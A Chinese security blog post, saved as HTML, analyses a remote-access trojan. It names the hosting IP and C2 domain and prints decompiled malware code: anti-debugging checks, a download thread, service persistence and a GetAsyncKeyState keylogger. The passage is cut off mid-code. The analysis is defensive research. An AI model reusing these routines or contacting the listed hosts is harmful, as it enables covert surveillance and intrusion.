@@ -1,0 +1,923 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="样本分析在处理日常的任务中发现可疑IP：172.247.132.146，简单查看是一个保存文件的站点，只保存了shoves.exe文件：  该文件疑似远控木马，现做简要分析。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一例RAT木马分析">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;07&#x2F;18&#x2F;%E4%B8%80%E4%BE%8BRAT%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90&#x2F;index.html">
+<meta property="og:site_name" content="Ivoripuion&#39;s blog">
+<meta property="og:description" content="样本分析在处理日常的任务中发现可疑IP：172.247.132.146，简单查看是一个保存文件的站点，只保存了shoves.exe文件：  该文件疑似远控木马，现做简要分析。">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;07&#x2F;18&#x2F;%E4%B8%80%E4%BE%8BRAT%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90&#x2F;record1.PNG">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;07&#x2F;18&#x2F;%E4%B8%80%E4%BE%8BRAT%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90&#x2F;record2.PNG">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;07&#x2F;18&#x2F;%E4%B8%80%E4%BE%8BRAT%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90&#x2F;record3.PNG">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;07&#x2F;18&#x2F;%E4%B8%80%E4%BE%8BRAT%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90&#x2F;record4.PNG">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;07&#x2F;18&#x2F;%E4%B8%80%E4%BE%8BRAT%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90&#x2F;record5.PNG">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;07&#x2F;18&#x2F;%E4%B8%80%E4%BE%8BRAT%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90&#x2F;record6.PNG">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;07&#x2F;18&#x2F;%E4%B8%80%E4%BE%8BRAT%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90&#x2F;record7.PNG">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;07&#x2F;18&#x2F;%E4%B8%80%E4%BE%8BRAT%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90&#x2F;record8.PNG">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;07&#x2F;18&#x2F;%E4%B8%80%E4%BE%8BRAT%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90&#x2F;record13.PNG">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;07&#x2F;18&#x2F;%E4%B8%80%E4%BE%8BRAT%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90&#x2F;record9.PNG">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;07&#x2F;18&#x2F;%E4%B8%80%E4%BE%8BRAT%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90&#x2F;record11.PNG">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;07&#x2F;18&#x2F;%E4%B8%80%E4%BE%8BRAT%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90&#x2F;record10.PNG">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;07&#x2F;18&#x2F;%E4%B8%80%E4%BE%8BRAT%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90&#x2F;record12.PNG">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;07&#x2F;18&#x2F;%E4%B8%80%E4%BE%8BRAT%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90&#x2F;record14.PNG">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;07&#x2F;18&#x2F;%E4%B8%80%E4%BE%8BRAT%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90&#x2F;record15.PNG">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;07&#x2F;18&#x2F;%E4%B8%80%E4%BE%8BRAT%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90&#x2F;record16.PNG">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;07&#x2F;18&#x2F;%E4%B8%80%E4%BE%8BRAT%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90&#x2F;record17.PNG">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;07&#x2F;18&#x2F;%E4%B8%80%E4%BE%8BRAT%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90&#x2F;record18.PNG">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;07&#x2F;18&#x2F;%E4%B8%80%E4%BE%8BRAT%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90&#x2F;record19.PNG">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;07&#x2F;18&#x2F;%E4%B8%80%E4%BE%8BRAT%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90&#x2F;record20.PNG">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;07&#x2F;18&#x2F;%E4%B8%80%E4%BE%8BRAT%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90&#x2F;record21.PNG">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;07&#x2F;18&#x2F;%E4%B8%80%E4%BE%8BRAT%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90&#x2F;record22.PNG">
+<meta property="og:updated_time" content="2020-07-17T17:33:46.891Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;07&#x2F;18&#x2F;%E4%B8%80%E4%BE%8BRAT%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90&#x2F;record1.PNG">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/07/18/一例RAT木马分析/"/>
+
+
+
+
+
+  <title>一例RAT木马分析 | Ivoripuion's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Ivoripuion's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-pwn">
+          <a href="/categories/pwn" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            pwn
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-web">
+          <a href="/categories/web" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            web
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-reverse">
+          <a href="/categories/reverse" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            reverse
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-随想">
+          <a href="/categories/%E9%9A%8F%E6%83%B3" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            随想
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/07/18/%E4%B8%80%E4%BE%8BRAT%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ivoripuion">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/me.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ivoripuion's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">一例RAT木马分析</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-07-18T01:30:20+08:00">
+                2020-07-18
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/resverse/" itemprop="url" rel="index">
+                    <span itemprop="name">resverse</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="样本分析"><a href="#样本分析" class="headerlink" title="样本分析"></a>样本分析</h1><p>在处理日常的任务中发现可疑IP：172.247.132.146，简单查看是一个保存文件的站点，只保存了shoves.exe文件：</p>
+<p><img src="/2020/07/18/%E4%B8%80%E4%BE%8BRAT%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/record1.PNG" alt></p>
+<p>该文件疑似远控木马，现做简要分析。</p>
+<a id="more"></a>
+
+<h2 id="沙箱分析"><a href="#沙箱分析" class="headerlink" title="沙箱分析"></a>沙箱分析</h2><p>程序运行后该程序会不断地向域名为<code>vip79318901.f3322.net</code>的主机发送请求：</p>
+<p>ApataDNS：</p>
+<p><img src="/2020/07/18/%E4%B8%80%E4%BE%8BRAT%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/record2.PNG" alt></p>
+<p>inetsim：</p>
+<p><img src="/2020/07/18/%E4%B8%80%E4%BE%8BRAT%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/record3.PNG" alt></p>
+<p>存在修改注册表以自启动：</p>
+<p><img src="/2020/07/18/%E4%B8%80%E4%BE%8BRAT%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/record4.PNG" alt></p>
+<p>修改读取镜像劫持相关的注册表：</p>
+<p><img src="/2020/07/18/%E4%B8%80%E4%BE%8BRAT%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/record5.PNG" alt></p>
+<p><img src="/2020/07/18/%E4%B8%80%E4%BE%8BRAT%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/record6.PNG" alt></p>
+<p>其他有关网络配置的敏感操作：</p>
+<p><img src="/2020/07/18/%E4%B8%80%E4%BE%8BRAT%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/record7.PNG" alt></p>
+<p>不存在文件的写入操作，但存在大量的文件读操作用于导入函数：</p>
+<p><img src="/2020/07/18/%E4%B8%80%E4%BE%8BRAT%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/record8.PNG" alt></p>
+<p>云沙箱分析结果：</p>
+<p><img src="/2020/07/18/%E4%B8%80%E4%BE%8BRAT%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/record13.PNG" alt></p>
+<h2 id="PE文件分析"><a href="#PE文件分析" class="headerlink" title="PE文件分析"></a>PE文件分析</h2><p>程序未加壳：</p>
+<p><img src="/2020/07/18/%E4%B8%80%E4%BE%8BRAT%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/record9.PNG" alt></p>
+<p>恶意代码存在自定义的<code>baidu</code>段：</p>
+<p><img src="/2020/07/18/%E4%B8%80%E4%BE%8BRAT%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/record11.PNG" alt></p>
+<p>内部使用了RC4/5算法进行加/解密：</p>
+<p><img src="/2020/07/18/%E4%B8%80%E4%BE%8BRAT%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/record10.PNG" alt></p>
+<p>程序最开始使用<code>GetStartupInfoA</code>进行简单的反调试：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>00401F9A                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+StartupInfo]</span><br><span class="line"><span class="symbol">.text:</span>00401F9D                 <span class="keyword">push</span>    <span class="built_in">eax</span>             <span class="comment">; lpStartupInfo</span></span><br><span class="line"><span class="symbol">.text:</span>00401F9E                 <span class="keyword">call</span>    <span class="built_in">ds</span>:GetStartupInfoA</span><br><span class="line"><span class="symbol">.text:</span>00401FA4                 <span class="keyword">call</span>    __wincmdln</span><br><span class="line"><span class="symbol">.text:</span>00401FA9                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+lpCmdLine], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>00401FAC                 <span class="keyword">test</span>    <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+StartupInfo<span class="number">.</span>dwFlags], <span class="number">1</span></span><br><span class="line"><span class="symbol">.text:</span>00401FB0                 <span class="keyword">jz</span>      short loc_401FB8</span><br><span class="line"><span class="symbol">.text:</span>00401FB2                 <span class="keyword">movzx</span>   <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+StartupInfo<span class="number">.</span>wShowWindow]</span><br><span class="line"><span class="symbol">.text:</span>00401FB6                 <span class="keyword">jmp</span>     short loc_401FBB</span><br></pre></td></tr></table></figure>
+
+<p>对程序部分指令解密，相关操作存放在恶意代码自定义的<code>baidu</code>段中：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">baidu:00410213 52                                      push    edx</span><br><span class="line">baidu:00410214 50                                      push    eax</span><br><span class="line">baidu:00410215 68 BC 60 41 00                          push    offset byte_4160BC</span><br><span class="line">baidu:0041021A E8 91 FD FF FF                          call    decrypt_40FFB0</span><br></pre></td></tr></table></figure>
+
+<p>解密是对0x4160BC开始的一段数据的操作，完成后内存从0x4160BC开始是一个DLL文件，该程序的主要攻击行为都在这个dll中：</p>
+<p><img src="/2020/07/18/%E4%B8%80%E4%BE%8BRAT%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/record12.PNG" alt></p>
+<p>DLL文件仅有一个到处函数<code>fuckyou</code>：</p>
+<p><img src="/2020/07/18/%E4%B8%80%E4%BE%8BRAT%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/record14.PNG" alt></p>
+<h3 id="DllMain分析"><a href="#DllMain分析" class="headerlink" title="DllMain分析"></a>DllMain分析</h3><p>DllMain主要是一些初始化的操作：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">GetInputState();</span><br><span class="line"> cur_thread_id = GetCurrentThreadId();</span><br><span class="line"> PostThreadMessageA(cur_thread_id, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"> GetMessageA(&amp;Msg, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);                   <span class="comment">// </span></span><br><span class="line">                                               <span class="comment">// </span></span><br><span class="line"> <span class="keyword">if</span> ( dword_10011FBC )                         <span class="comment">// 通过检测当前进程的父进程是不是explorer来进行反调试</span></span><br><span class="line"> &#123;</span><br><span class="line">   explorer_pid = get_explore_pid_100070B0();</span><br><span class="line">   cur_pro_id = GetCurrentProcessId();</span><br><span class="line">   <span class="keyword">if</span> ( (explorer_pid == <span class="number">0</span>) == get_parent_process_pid_10007000(cur_pro_id) )</span><br><span class="line">     ExitProcess(<span class="number">0</span>);</span><br><span class="line"> &#125;                                             <span class="comment">// </span></span><br><span class="line">                                               <span class="comment">// </span></span><br><span class="line"> VersionInformation.dwOSVersionInfoSize = <span class="number">148</span>;</span><br><span class="line"> GetVersionExA(&amp;VersionInformation);           <span class="comment">// </span></span><br><span class="line">                                               <span class="comment">// </span></span><br><span class="line"> <span class="keyword">if</span> ( &amp;dword_10011FCC != <span class="number">-2</span> )</span><br><span class="line">   create_thread_100080D0(<span class="number">0</span>, <span class="number">0</span>, download_from_url_10006100, &amp;dword_10011FCC + <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>);<span class="comment">// 开启一个线程下载文件</span></span><br><span class="line">                                               <span class="comment">// </span></span><br><span class="line"> <span class="keyword">if</span> ( dword_10011FC8 )                         <span class="comment">// kill run32dll.exe</span></span><br><span class="line">   kill_run32dll_10005CB0();</span><br><span class="line"> <span class="keyword">if</span> ( !byte_10011FB8 )                         <span class="comment">// 注册服务相关</span></span><br><span class="line">                                               <span class="comment">// </span></span><br><span class="line"> &#123;</span><br><span class="line">   <span class="keyword">String</span> = <span class="number">0</span>;</span><br><span class="line">   <span class="built_in">memset</span>(&amp;v25, <span class="number">0</span>, <span class="number">0x3FC</span>u);</span><br><span class="line">   v26 = <span class="number">0</span>;</span><br><span class="line">   v27 = <span class="number">0</span>;</span><br><span class="line">   Format = <span class="string">'%'</span>;</span><br><span class="line">   v12 = <span class="string">'s'</span>;</span><br><span class="line">   v13 = <span class="number">0</span>;</span><br><span class="line">   <span class="built_in">sprintf</span>(ServiceName_10011CD4, &amp;Format, ServiceName_10011CD4);</span><br><span class="line">   ServiceStartTable.lpServiceName = 'nnoC';</span><br><span class="line">   ServiceStartTable.lpServiceProc = 'Gtce';</span><br><span class="line">   v15 = 'puor';</span><br><span class="line">   LOBYTE(v16) = <span class="number">0</span>;</span><br><span class="line">   set_service_reg_10004D50(ServiceName_10011CD4, &amp;ServiceStartTable, &amp;<span class="keyword">String</span>, <span class="number">1024</span>);<span class="comment">// 注册服务：</span></span><br><span class="line">                                               <span class="comment">// Rspgcu zcltpgnd</span></span><br><span class="line">                                               <span class="comment">// </span></span><br><span class="line">   <span class="keyword">if</span> ( !lstrlenA(&amp;<span class="keyword">String</span>) )</span><br><span class="line">   &#123;</span><br><span class="line">     reg_service_10003050(ServiceName_10011CD4, a1521);</span><br><span class="line">     reg_set_10005D20(ServiceName_10011CD4);</span><br><span class="line">   &#125;</span><br><span class="line">   v9 = init_COM_10006FB0();</span><br><span class="line">   wsprintfA(&amp;String2, aS, v9);</span><br><span class="line">   <span class="keyword">if</span> ( dword_10011FB4 )</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="built_in">memset</span>(&amp;Dst, <span class="number">0</span>, <span class="number">0x104</span>u);</span><br><span class="line">     GetModuleFileNameA(<span class="number">0</span>, &amp;Dst, <span class="number">0x104</span>u);</span><br><span class="line">     SHGetSpecialFolderPathA(<span class="number">0</span>, &amp;v18, <span class="number">43</span>, <span class="number">0</span>);</span><br><span class="line">     lstrcatA(&amp;v18, asc_1001172C);</span><br><span class="line">     lstrcatA(&amp;v18, &amp;String2);</span><br><span class="line">     lstrcatA(&amp;v18, aExe);</span><br><span class="line">     MoveFileA(&amp;Dst, &amp;v18);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">     <span class="built_in">memset</span>(&amp;Filename, <span class="number">0</span>, <span class="number">0x104</span>u);</span><br><span class="line">     GetModuleFileNameA(<span class="number">0</span>, &amp;Filename, <span class="number">0x104</span>u);</span><br><span class="line">   &#125;</span><br><span class="line">   Sleep(<span class="number">0x32</span>u);</span><br><span class="line">   v10 = create_thread_100080D0(<span class="number">0</span>, <span class="number">0</span>, sub_100063D0, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">   WaitForSingleObject(v10, <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">   CloseHandle(v10);</span><br><span class="line">   <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">     Sleep(<span class="number">1000000u</span>);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>包括反调试,初始化服务,开启服务等操作。</p>
+<p>程序的主要攻击方法存放在<code>attackfun_100063D0()</code>中：</p>
+<ol>
+<li>确保只有一个运行实例：</li>
+</ol>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">v0 = CreateMutexA(<span class="number">0</span>, <span class="number">0</span>, &amp;Name);               <span class="comment">// 确保只有一个运行实例</span></span><br><span class="line"><span class="keyword">if</span> ( v0 &amp;&amp; GetLastError() == ERROR_ALREADY_EXISTS )</span><br><span class="line">&#123;</span><br><span class="line">    ReleaseMutex(v0);</span><br><span class="line">    CloseHandle(v0);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>击键记录：</li>
+</ol>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( dword_10011FC0 )</span><br><span class="line">&#123;</span><br><span class="line">    sub_10003AB0(v23, v8);</span><br><span class="line">    LOBYTE(v24) = <span class="number">1</span>;</span><br><span class="line">    input_record_10003AE0();</span><br><span class="line">    LOBYTE(v24) = <span class="number">0</span>;</span><br><span class="line">    sub_10003A60(v23);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">input_record_10003AE0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> create_thread_100080D0(<span class="number">0</span>, <span class="number">0</span>, key_logger_100026A0, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用<code>GetKeyState</code>, <code>GetAsyncKeyState</code>实现击键记录： </p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">v3 = GetKeyState(<span class="number">16</span>);</span><br><span class="line">v4 = *&amp;byte_100113DC[v2 * <span class="number">4</span>];</span><br><span class="line">v5 = v3;</span><br><span class="line"><span class="keyword">if</span> ( ((GetAsyncKeyState(*&amp;byte_100113DC[v2 * <span class="number">4</span>]) &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0x80</span>u) == <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">v6 = *(&amp;v8 + v4);</span><br><span class="line"><span class="keyword">if</span> ( v6 )</span><br><span class="line">&#123;</span><br><span class="line">    *(&amp;v8 + v4) = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">8</span> )</span><br><span class="line">  